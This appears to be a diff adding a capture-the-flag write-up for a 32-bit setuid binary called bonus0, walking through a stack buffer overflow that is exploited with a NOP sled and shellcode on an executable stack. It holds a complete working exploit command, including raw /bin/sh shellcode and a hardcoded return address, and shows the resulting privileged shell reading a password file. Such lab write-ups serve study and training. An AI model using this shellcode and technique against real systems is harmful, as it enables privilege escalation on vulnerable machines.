@@ -1,3 +1,198 @@
+# BONUS 00 - Stack Buffer Overflow → ret2shellcode
+
+> Vulnerability class: Stack Buffer Overflow
+> Binary: ELF 32-bits, dynamically linked, not stripped
+> Tools used: GDB, objdump, file
+
+---
+
+## Overview
+
+The program reads two inputs at runtime and concatenates them. By injecting a NOP sled and shellcode in the first input, and a crafted return address in the second, we redirect EIP into our shellcode on the stack.
+
+---
+
+## 1. Reconnaissance
+
+```bash
+$ file bonus0
+bonus0: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, not stripped
+```
+```bash
+$ checksec --file ./bonus0
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   ./bonus0
+```
+
+Key observations:
+
+- setuid/setgid binary: successful exploitation escalates privileges
+- not stripped: function names are preserved, simplifying static analysis
+- dynamically linked: library functions resolved at runtime via PLT/GOT
+- NX disabled: the stack and heap are executable, meaning injected shellcode can run directly
+- ASLR off: addresses are fixed across runs, no need to leak or brute force memory layout
+- No stack canary: the saved return address can be overwritten without triggering any detection
+- No PIE: the binary is loaded at a fixed base address every time, making PLT/GOT addresses predictable
+
+---
+
+## 2. Static Analysis
+
+### 2.1 Program behavior
+
+The program prompts twice with `-` and concatenates both inputs before printing:
+
+```bash
+$ ./bonus0
+-
+hello
+-
+world
+hello world
+```
+
+With large inputs it segfaults:
+
+```bash
+$ ./bonus0
+-
+AAAA....(84 A's)
+-
+BBBB....(84 B's)
+AAAAAAAAAAAAAAAAAAAA BBBBBBBBBBBBBBBBBBBB���
+Segmentation fault
+```
+
+### 2.2 Identifying the overflow
+
+In GDB, large inputs confirm EIP is overwritten by the second input:
+
+```bash
+(gdb) run
+-
+AAAA...(84 A's)
+-
+BBBB...(20 B's)
+Program received signal SIGSEGV
+eip = 0x42424242
+```
+
+To pinpoint the exact offset within the second input, we use distinct 4-byte groups:
+
+```bash
+-
+AAAA...(84 A's)
+-
+CCCCDDDDEEEEFFFFGGGG
+
+Program received signal SIGSEGV
+eip = 0x46454545    ← "EEEF"
+```
+
+`0x46454545` = `FEEE` in little-endian → EIP is overwritten starting at byte **9** of the second input, spanning 4 bytes (`EEEF`). The offset is therefore:
+
+```
+[ 9 bytes padding ] [ 4 bytes EIP ] [ 7 bytes trailing ]
+```
+
+Regardless of how long the first input is, the offset within the second input stays fixed at 9.
+
+---
+
+## 3. Vulnerability
+
+The `p()` function reads input into a fixed stack buffer without bounds checking. The two reads each write into separate stack buffers, and the subsequent concatenation copies both into a third buffer — overflowing its bounds and reaching the saved return address.
+
+---
+
+## 4. Exploitation
+
+### 4.1 Strategy
+
+Since NX is disabled and ASLR is off:
+
+- First input: NOP sled + shellcode injected directly onto the stack
+- Second input: 9 bytes padding + stack address pointing into the NOP sled + 7 bytes trailing
+
+### 4.2 Locate the shellcode on the stack
+
+We break after `p()` reads the first input and inspect the stack:
+
+```bash
+(gdb) break *p+58
+(gdb) run < <(python -c 'print "\x90" * 200 + "<shellcode>"')
+
+(gdb) x/500x $esp
+0xbfffe670:    0x90909090    0x90909090    ...
+0xbfffe6d0:    0x90909090    0x90909090    ← middle of NOP sled
+0xbfffe730:    0xdb31c031    0x80cd06b0    ← shellcode starts
+```
+
+We pick `0xbfffe6d0` as our return address — safely in the middle of the NOP sled.
+
+### 4.3 Payload construction
+
+```
+input 1: [ \x90 × 200 ] + [ shellcode ]
+input 2: [ "B" × 9 ] + [ 0xbfffe6d0 ] + [ "C" × 7 ]
+```
+
+- 200 NOP bytes give a wide landing zone before the shellcode
+- 9 bytes of padding fill the stack up to the saved EIP
+- `\xd0\xe6\xff\xbf` overwrites EIP with the NOP sled address
+- 7 trailing bytes pad the remaining space after EIP
+
+### 4.4 Feeding two runtime inputs
+
+Since the program reads from stdin twice interactively, we chain two `python -c` commands and keep stdin open with `cat`:
+
+```bash
+(python -c 'CMD1'; python -c 'CMD2'; cat) | ./bonus0
+```
+
+### 4.5 Execution
+
+```bash
+$ (python -c 'print "\x90" * 200 + "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"'; python -c 'print "B" * 9 + "\xd0\xe6\xff\xbf" + "C" * 7'; cat) | ./bonus0
+-
+-
+��������������������BBBBBBBBB����CCCCCCC��� BBBBBBBBB����CCCCCCC���
+$ whoami
+bonus1
+$ cat /home/user/bonus1/.pass
+XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+```
+
+---
+
+## 5. Key Takeaways
+
+| Concept | Detail |
+|---|---|
+| Two-input overflow | First input places shellcode on stack, second input controls EIP |
+| Fixed offset independence | The EIP offset within input 2 is fixed regardless of input 1 length |
+| NOP sled reliability | 200 NOP bytes give a wide landing zone, tolerating minor address variation between GDB and shell |
+| stdin chaining | `(cmd1; cmd2; cat) | ./bin` is the correct pattern for programs with multiple interactive reads |
+| Stack shellcode | With NX off and ASLR off, the stack is directly executable — no heap or env var needed |
+
+
+
+
+
+
+
+
+
+
+##### V11111111
+
+
+
+
+
+
+
+
 # BONUS0
 
 ## Analysis:
